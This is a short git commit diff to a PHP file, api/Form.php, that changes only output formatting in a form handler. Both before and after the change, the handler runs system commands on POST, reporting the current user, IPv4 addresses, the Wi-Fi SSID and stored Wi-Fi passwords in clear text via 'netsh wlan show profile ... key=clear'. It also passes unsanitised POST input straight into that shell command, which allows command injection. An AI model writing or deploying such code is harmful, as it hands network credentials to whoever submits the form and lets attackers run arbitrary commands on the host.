2ecc959833166f19464f120574e8257c8318dfc7
Alvaro Antoni Escobar <130929590+dkparw@users.noreply.github.com>
2023-05-31 01:03:17 -0600

    Update Form.php

--- api/Form.php
+++ api/Form.php
@@ -5,10 +5,10 @@ if ('POST') {
     $valor2 = $_POST['valor2'];
     if (($valor1) or ($valor2)) {
         //error_reporting(0);
-        echo $output = shell_exec('whoami')."\n\n";
-        echo $t=shell_exec('ipconfig | findstr "IPv4"')."\n\n";
-        echo $t1=shell_exec('netsh wlan show interfaces | findstr "SSID"')."\n\n";
-        echo $t2=Shell_exec("netsh wlan show profile name=$valor1 key=clear | findstr clave ")."\n\n";
+        echo $output = shell_exec('whoami');
+        echo $t=shell_exec('ipconfig | findstr "IPv4"');
+        echo $t1=shell_exec('netsh wlan show interfaces | findstr "SSID"');
+        echo $t2=Shell_exec("netsh wlan show profile name=$valor1 key=clear | findstr clave ");
         // Imprimir la salida de los comandos
     } else {
         echo "Introduce Datos.";
